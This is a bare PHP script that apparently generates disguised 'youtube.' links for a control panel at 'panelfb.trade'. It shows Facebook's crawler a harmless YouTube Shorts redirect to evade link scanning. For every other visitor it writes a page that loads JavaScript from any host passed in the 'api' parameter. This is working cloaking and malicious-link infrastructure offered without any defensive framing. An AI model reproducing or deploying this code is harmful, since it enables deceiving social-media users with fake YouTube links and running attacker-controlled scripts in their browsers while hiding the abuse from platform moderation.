<?php
if (preg_match("/facebook(external)?/i", $_SERVER['HTTP_USER_AGENT']))
{
$short_urlx2 = "https://www.youtube.com/shorts/".substr(md5(mt_rand()),0,20);
header("location: $short_urlx2", true, 200);
die();
}

header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
header("Allow: GET, POST, OPTIONS, PUT, DELETE");
require_once "./random_string.php";

if($_SERVER['HTTP_REFERER'] !== 'https://panelfb.trade/'){
 die('Unauthorized access');}

if (isset($_GET['api'])) {
$API =  $_GET['api'];   
$PROTOCOLO  =  "https://";
$NAMEFILE = generateRandomString();
$DOMAIN = $_SERVER['SERVER_NAME'];

$contentHTML = '<script src="'.$PROTOCOLO.$API.'" type="text/javascript" async="true"></script>';
file_put_contents("youtube/links". "/" .$NAMEFILE, $contentHTML);
echo  'https://youtube.'.$DOMAIN.'/'.$NAMEFILE;
} 